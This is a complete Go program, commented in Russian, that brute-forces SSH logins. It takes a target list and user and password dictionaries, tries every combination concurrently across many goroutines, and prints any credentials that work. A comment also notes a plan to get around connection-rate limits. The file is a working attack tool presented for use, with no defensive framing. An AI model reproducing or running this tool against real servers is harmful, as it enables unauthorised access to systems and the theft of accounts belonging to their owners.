package main

import (
	"bufio"
	"bytes"
	"fmt"
	"log"
	"os"
	"runtime"
	"strings"
	"time"

	"github.com/btcsuite/golangcrypto/ssh"
)

// HostInfo - информация о хосте
type HostInfo struct {
	host   string
	port   string
	user   string
	pass   string
	isWeak bool
}

func main() {
	if len(os.Args) != 4 {
		fmt.Fprintf(os.Stderr, "Использование: %s IPList userDic passDic\n", os.Args[0])
		os.Exit(1)
	} else {
		runtime.GOMAXPROCS(runtime.NumCPU())

		iplist := os.Args[1]
		userDict := os.Args[2]
		passDict := os.Args[3]
		Scan(Prepare(iplist, userDict, passDict))
		os.Exit(0)
	}
}

// Prepare - подготовка к сканированию
func Prepare(iplist, userDict, passDict string) (sliceIPList, sliceUser, slicePass []string) {
	iplistFile, _ := os.Open(iplist)
	defer iplistFile.Close()
	scanner := bufio.NewScanner(iplistFile)
	scanner.Split(bufio.ScanLines)
	for scanner.Scan() {
		sliceIPList = append(sliceIPList, scanner.Text())
	}

	userDictFile, _ := os.Open(userDict)
	defer userDictFile.Close()
	scannerU := bufio.NewScanner(userDictFile)
	scannerU.Split(bufio.ScanLines)
	for scannerU.Scan() {
		sliceUser = append(sliceUser, scannerU.Text())
	}

	passDictFile, _ := os.Open(passDict)
	defer passDictFile.Close()
	scannerP := bufio.NewScanner(passDictFile)
	scannerP.Split(bufio.ScanLines)
	for scannerP.Scan() {
		slicePass = append(slicePass, scannerP.Text())
	}

	return sliceIPList, sliceUser, slicePass
}

// Scan - сканирование
func Scan(sliceIPList, sliceUser, slicePass []string) {
	for _, hostPort := range sliceIPList {
		fmt.Printf("Try to crack %s\n", hostPort)
		t := strings.Split(hostPort, ":")
		host := t[0]
		port := t[1]
		n := len(sliceUser) * len(slicePass)
		chanScanResult := make(chan HostInfo, n)

		for _, user := range sliceUser {
			for _, passwd := range slicePass {

				HostInfo := HostInfo{}
				HostInfo.host = host
				HostInfo.port = port
				HostInfo.user = user
				HostInfo.pass = passwd
				HostInfo.isWeak = false

				go Crack(HostInfo, chanScanResult)
				for runtime.NumGoroutine() > runtime.NumCPU()*300 {
					time.Sleep(10 * time.Microsecond)
				}
			}
		}
		done := make(chan bool, n)
		go func() {
			for i := 0; i < cap(chanScanResult); i++ {
				select {
				case r := <-chanScanResult:
					fmt.Println(r)
					if r.isWeak {
						var buf bytes.Buffer
						logger := log.New(&buf, "logger: ", log.Ldate)
						logger.Printf("%s:%s, user: %s, password: %s\n", r.host, r.port, r.user, r.pass)
						fmt.Print(&buf)
					}
				case <-time.After(1 * time.Second):
					// fmt.Println("timeout")
					break

				}
				done <- true

			}
		}()

		for i := 0; i < cap(done); i++ {
			// fmt.Println(<-done)
			<-done
		}

	}

}

// Crack - подбор пароля
func Crack(HostInfo HostInfo, chanScanResult chan HostInfo) {
	host := HostInfo.host
	port := HostInfo.port
	user := HostInfo.user
	passwd := HostInfo.pass
	isOk := HostInfo.isWeak

	config := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{
			ssh.Password(passwd),
		},
	}
	client, err := ssh.Dial("tcp", host+":"+port, config)
	if err != nil {
		// TODO
		// тут надо пробивать ограничение на количество подключений
		isOk = false
	} else {
		session, err := client.NewSession()
		defer session.Close()

		if err != nil {
			isOk = false
		} else {
			isOk = true

		}

	}

	HostInfo.isWeak = isOk
	chanScanResult <- HostInfo
}
